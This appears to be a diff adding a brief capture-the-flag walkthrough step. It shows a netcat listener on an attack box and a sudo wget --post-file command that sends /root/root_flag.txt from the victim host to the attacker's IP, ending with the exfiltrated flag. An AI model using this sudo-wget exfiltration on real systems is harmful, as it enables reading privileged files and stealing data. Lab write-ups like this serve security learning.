@@ -1,0 +1,23 @@
+On the attack box I ran:
+root@ip-10-65-122-75:~# nc -lvnp 4444
+Listening on 0.0.0.0 4444
+
+On jessie's machine I ran:
+jessie@CorpOne:~/Documents$ sudo /usr/bin/wget --post-file=/root/root_flag.txt http://10.65.122.75:4444
+--2026-06-24 21:09:33--  http://10.65.122.75:4444/
+Connecting to 10.65.122.75:4444... connected.
+HTTP request sent, awaiting response...
+
+On the attack box I received:
+Connection received on 10.65.137.127 34876
+POST / HTTP/1.1
+User-Agent: Wget/1.17.1 (linux-gnu)
+Accept: */*
+Accept-Encoding: identity
+Host: 10.65.122.75:4444
+Connection: Keep-Alive
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 33
+
+b1b968b37519ad1daa6408188649263d
+
